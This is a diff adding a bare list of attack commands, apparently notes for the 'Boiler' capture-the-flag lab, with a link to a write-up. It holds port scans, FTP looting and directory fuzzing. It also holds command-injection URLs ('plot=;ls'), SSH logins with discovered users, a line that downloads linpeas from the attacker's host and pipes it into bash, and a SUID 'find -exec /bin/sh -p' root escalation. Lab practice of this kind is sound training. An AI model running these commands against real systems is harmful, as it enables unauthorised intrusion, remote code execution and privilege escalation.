@@ -1,0 +1,35 @@
+sudo nmap 127.0.0.1 -oN Nmap/initial
+sudo nmap 127.0.0.1 -p- -oN Nmap/all
+sudo nmap 127.0.0.1 -p21,80,10000,55007 -sC -sV -O -T5 -oN Nmap/scripts
+
+sudo nmap -sC -sV -Pn -n --disable-arp-ping --top-ports=1000 127.0.0.1
+sudo nmap -sC -sV -Pn -n --disable-arp-ping -p10000-50000 127.0.0.1
+nmap -p21,80,10000,55007 -sV -sC -T4 -Pn -oA 127.0.0.1
+
+nmap -Pn -A -v 127.0.0.1
+
+ftp 127.0.0.1
+ls -lah
+get .info.txt
+
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://127.0.0.1/FUZZ
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://127.0.0.1/joomla/FUZZ — recursion — recursion-depth 1
+ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://127.0.0.1/joomla/FUZZ — recursion — recursion-depth 1 -e txt
+
+http://10.10.120.184/joomla/_test/index.php?plot=;ls
+http://10.10.120.184/joomla/_test/index.php?plot=;cat%20log.txt
+
+ssh -p 55007 basterd@10.10.186.184
+ls -alh
+cat backup.sh
+
+ssh -p 55007 stoner@10.10.186.184
+
+python3 -m http.server
+curl http://[VPN IP]:8000/linpeas.sh | bash
+
+find /usr/bin
+find . -exec /bin/sh -p \; -quit
+
+
+https://r4bb1t.medium.com/boiler-ctf-write-up-79bcbe77e924
